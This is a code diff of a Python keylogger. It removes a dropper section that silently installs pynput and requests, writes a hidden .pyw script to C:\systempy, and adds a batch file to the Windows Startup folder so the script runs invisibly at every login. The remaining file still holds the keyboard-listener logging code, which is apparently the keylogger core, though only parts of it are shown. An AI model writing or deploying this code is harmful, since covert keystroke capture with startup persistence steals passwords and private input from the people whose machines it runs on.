@@ -1,29 +1,4 @@
-import os
-import subprocess
-import sys
-import threading
-
-libraries = ["pynput", "requests"]
-def install_libraries(libraries):
-    for lib in libraries:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
-
-install_libraries(libraries)
-
-
-pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
-python_file_name = "new_key.pyw"
-batch_file_name = "new_start.bat"
-
-startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-systempy_folder = "C:\\systempy"
-python_script_dest = os.path.join(systempy_folder, python_file_name)
-batch_file_path = os.path.join(startup_folder, batch_file_name)
-
-if not os.path.exists(systempy_folder):
-    os.makedirs(systempy_folder)
-
-python_code = '''from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener
 import os
 from datetime import datetime
 import time
@@ -82,18 +57,3 @@ def start_listener():
 
 if __name__ == "__main__":
     start_listener()
-'''
-
-with open(python_script_dest, "w") as file:
-    file.write(python_code)
-
-batch_file_content = f"""@echo off
-pushd %~dp0
-"{pythonw_path}" "{python_script_dest}"
-exit
-"""
-
-with open(batch_file_path, "w") as file:
-    file.write(batch_file_content)
-
-subprocess.run(batch_file_path, shell=True)
